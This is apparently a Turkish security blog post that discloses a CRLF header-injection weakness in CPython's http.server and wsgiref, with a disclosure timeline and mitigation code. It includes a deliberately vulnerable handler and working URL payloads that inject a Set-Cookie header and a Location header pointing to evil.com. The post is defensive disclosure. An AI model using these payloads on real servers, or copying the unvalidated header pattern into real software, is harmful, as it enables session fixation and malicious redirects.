---
layout: post
title: "CPython http.server ve wsgiref'te CRLF Injection"
date: 2026-04-24
author: Yunus Aydın
lang: tr
description: "CPython http.server ve wsgiref'de CRLF injection zafiyeti. send_header() üzerinden keyfi HTTP header ekleme — Set-Cookie ve Location saldırıları."
keywords: "CRLF injection CPython, http.server zafiyeti, wsgiref header injection, Python CRLF, Set-Cookie injection, open redirect Python, send_header exploit, Python güvenlik araştırması"
canonical_url: "https://aydinnyunus.github.io/2026/04/24/crlf-injection-cpython-http-server-wsgiref-tr/"
---

CPython'ın standart kütüphanesinde **CRLF injection** zafiyeti buldum — `http.server` ve `wsgiref` modüllerinde. Uygulama kullanıcı girdisini `send_header()` üzerinden HTTP header'larına yansıtırsa, saldırgan keyfi header'lar ekleyebiliyor. CPython takımı documentation'ı güncelleyerek uyarı koydu: [#142605](https://github.com/python/cpython/pull/142605), [#143395](https://github.com/python/cpython/pull/143395), [#148020](https://github.com/python/cpython/pull/148020), [#148021](https://github.com/python/cpython/pull/148021).

## Savunmasız kod

`Lib/http/server.py` içindeki `send_header()`, header değerini buffer'a direkt yazıyor. Kontrolsüz:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
    # value içinde \r veya \n kontrolü yok
```

Format string'in sonundaki `\r\n` header satırını sonlandırıyor. Eğer `value`'nin içinde `\r\n` varsa, header erken bitiyor — ve sonrasındaki her şey yeni, kontrol edilmemiş bir header satırı oluyor. Injection noktası tam burada.

## Senaryo 1: Set-Cookie injection

Query parametresini custom header'a yansıtan basit bir uygulama:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        custom_val = query.get('val', [''])[0]
        
        self.send_response(200)
        self.send_header('X-Custom', custom_val)
        self.end_headers()
        self.wfile.write(b"Hello World")
```

Normal istek: `http://localhost:8000/?val=hello` → `X-Custom: hello`.

Saldırı:

```
http://localhost:8000/?val=test%0d%0aSet-Cookie:%20pwned=true
```

Sunucu yanıtı:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Set-Cookie: pwned=true
```

`%0d%0a`, URL encode edilmiş `\r\n`. Sunucu header'ı orada kesiyor. Saldırganın `Set-Cookie`'si şimdi geçerli bir response header'ı olarak duruyor. Tarayıcı bunu alıyor ve `pwned` cookie'sini kuruyor — hiçbir uyarı yok.

Buradan **session fixation** yapabilirsiniz: saldırgan kurbanı bu linke tıklatıyor, giriş yapmasını bekliyor, ardından önceden kurduğu session ID ile oturumu ele geçiriyor.

## Senaryo 2: Location header injection

Aynı uygulama, farklı payload:

```
http://localhost:8000/?val=test%0d%0ALocation:%20http://evil.com/
```

Yanıt:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Location: http://evil.com/
```

Sunucu HTTP 200 döndürdü ama saldırganın sitesine işaret eden bir `Location` header'ı koydu. Yanıtı işleyen proxy'ler, cache'ler, kütüphanelere bağlı olarak bu, durum kodu "OK" deşse de beklenmedik yönlendirmelere yol açabiliyor.

## Diğer saldırı yolları

Cookie ve redirect'in ötesinde, header injection şunları mümkün kılıyor:

- **Cache poisoning**: `Cache-Control` veya `Vary` header'ları enjekte ederek cache davranışını kontrol edebilirsiniz
- **XSS via content-type override**: Bazı framework'ler header'ları HTML'e yansıtıyor. `Content-Type: text/html` enjekte ederek `text/plain` dönecek bir yanıtı executable hale getirebilirsiniz
- **Web cache deception**: Kişisel yanıtların public URL'ler altında cache'lenmesini sağlayacak header'lar enjekte edebilirsiniz
- **Response splitting**: `\r\n\r\n` enjekte ederek header'ları erken sonlandırıp body'yi kontrol edebilirsiniz

## Kök neden

Zafiyet `send_header()`'ın girdisini doğrulamamasından kaynaklanıyor. HTTP spec'i header'larda satır sonu karakteri yasaklıyor; kütüphanenin bunu uygulaması gerekiyor.

"Bunu uygulama seviyesinde düzelt" argümanı işe yaramıyor. Evet, uygulamalar *should* kullanıcı girdisini temizlesin. Ama standart kütüphane bir zafiyet sınıfını trivial hale getirir mi, bu kütüphane tasarım problemidir. Defense in depth: kütüphane doğrular, uygulama da doğrular. Biri diğerinin yerini almaz.

## Düzeltme

CPython takımı **documentation approach** seçti, runtime validation enforcement yapmadı. Neden? Otomatik validation eklemek, CRLF'yi meşru amaçlar için kullanan mevcut kodu kıracaktı (line folding, encoded values gibi).

Bunun yerine `send_header()` ve `send_response_only()` documentation'ı güvenlik uyarısı ekledi:
- "CRLF sequences içeren girdileri reject etmiyor"
- "sanitized input" beklediğini varsayıyor

Sorumluluk geri geliştirici tarafına döndü: **`send_header()`'a vermeden önce kullanıcı girdisini validate veya encode etmeli**.

Kullanıcı girdisini yansıtırsan, doğru yap:

```python
# Yanlış: direkt reflection
self.send_header('X-Custom', user_input)

# Doğru: control karakterleri sil/reddet
safe_value = user_input.replace('\r', '').replace('\n', '')
self.send_header('X-Custom', safe_value)

# Ya da: sadece güvenli karakterleri içerdiğini doğrula
if '\r' in user_input or '\n' in user_input:
    return self.send_error(400, "Invalid header value")
self.send_header('X-Custom', user_input)
```

## Raporlama zaman çizelgesi

- **CPython'a raporlandı**: Security reporting process üzerinden (private disclosure)
- **Documentation PR'ları**: #142605, #143395, #148020, #148021
- **Etkilenen versiyonlar**: Zafiyetli kodu içeren tüm versiyonlar (Python 3.x 3.12+)
- **Durum**: Yazı tarihi itibarıyla current ve LTS branch'lerine documentation uyarısı fixlendi

CPython takımı bunu sorumlu şekilde yönetmiş — raporları kabul ettiler, birden fazla yerde dokumentasyon güncellediler ve kılavuzu gereksiz gecikme olmadan yayınladılar.

## Referanslar

- [PR #142605 on CPython](https://github.com/python/cpython/pull/142605) — http.server fix
- [PR #143395 on CPython](https://github.com/python/cpython/pull/143395) — wsgiref fix
- [PR #148020 on CPython](https://github.com/python/cpython/pull/148020) — http.server (3.12+)
- [PR #148021 on CPython](https://github.com/python/cpython/pull/148021) — wsgiref (3.12+)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- [HTTP/1.1 Specification (RFC 7230)](https://tools.ietf.org/html/rfc7230) — section 3.2

## İlgili içerik

- [SQL Injection Zafiyeti: GeoPandas to_postgis() Fonksiyonunda](/2025/12/27/sql-injection-geopandas-tr/) — veri işlemede protocol-level injection
- [CVE-2026-0562: LollMS friend request endpoint'inde IDOR](/2026/04/18/idor-lollms-friend-request-cve-2026-0562-tr/) — web service'lerde başka bir injection sınıfı zafiyeti
